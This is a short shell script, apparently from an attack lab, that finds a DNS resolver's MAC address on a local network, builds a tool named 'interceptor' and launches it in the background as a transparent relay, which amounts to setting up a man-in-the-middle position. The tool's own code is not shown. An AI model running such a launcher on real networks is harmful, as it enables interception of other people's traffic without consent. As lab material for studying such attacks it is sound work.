#!/bin/sh
set -eu

pkill -f interceptor 2>/dev/null || true

# Prime ARP cache by pinging resolver
ping -c 1 -W 1 172.16.2.10 >/dev/null 2>&1 || true
arping -c 1 -w 1 -I eth0 172.16.2.10 >/dev/null 2>&1 || true

# Get resolver MAC address from ip neigh or arp
RESOLVER_MAC=$(ip neigh show 172.16.2.10 2>/dev/null | awk '/lladdr/ {print $5}' | head -n1)
if [ -z "$RESOLVER_MAC" ]; then
    RESOLVER_MAC=$(awk '/172.16.2.10/ {print $4}' /proc/net/arp 2>/dev/null | head -n1)
fi

cd /lab/attacker
make

if [ -n "$RESOLVER_MAC" ] && [ "$RESOLVER_MAC" != "00:00:00:00:00:00" ]; then
    echo "Found resolver MAC: $RESOLVER_MAC"
    nohup ./interceptor --relay --resolver-mac "$RESOLVER_MAC" > /lab/attacker/interceptor.log 2>&1 &
else
    echo "Resolving MAC via interceptor..."
    nohup ./interceptor --relay > /lab/attacker/interceptor.log 2>&1 &
fi

sleep 1
cat /lab/attacker/interceptor.log
echo "Interceptor running in TRANSPARENT RELAY mode."
